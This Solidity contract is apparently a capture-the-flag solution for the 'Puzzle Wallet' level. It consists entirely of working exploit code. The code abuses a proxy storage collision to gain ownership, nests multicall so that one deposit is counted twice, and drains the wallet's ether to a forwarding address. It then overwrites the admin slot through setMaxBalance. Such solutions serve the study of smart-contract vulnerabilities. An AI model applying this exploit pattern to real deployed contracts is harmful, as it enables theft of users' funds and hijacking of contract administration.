// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import { IPuzzleWallet } from "./IPuzzleWallet.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";


contract PuzzleWalletSolution {

    address payable forwardingAddress;

    function hijack(IPuzzleWallet _puzzleWallet, address payable _newAdmin) external payable {
        _puzzleWallet.proposeNewAdmin(address(this));
        _puzzleWallet.addToWhitelist(address(this));

        bytes memory depositCalldata = abi.encodeWithSignature("deposit()");
        bytes[] memory depositCalldataArray = new bytes[](1);
        depositCalldataArray[0] = depositCalldata;
        bytes memory multicallCalldata = abi.encodeWithSignature("multicall(bytes[])", depositCalldataArray);
        bytes[] memory multicallCalldataArray = new bytes[](2);
        multicallCalldataArray[0] = multicallCalldata;
        multicallCalldataArray[1] = multicallCalldata;

        _puzzleWallet.multicall{value: address(_puzzleWallet).balance}(multicallCalldataArray);

        bytes memory withdrawCalldata;
        forwardingAddress = _newAdmin;
        _puzzleWallet.execute(address(this), address(_puzzleWallet).balance, withdrawCalldata);

        uint newAdminUint = uint(uint160(_newAdmin));
        _puzzleWallet.setMaxBalance(newAdminUint);

        require(_puzzleWallet.admin() == _newAdmin, "Admin should be new owner");
    }

    receive() external payable {
        forwardingAddress.send(msg.value);
    }

}
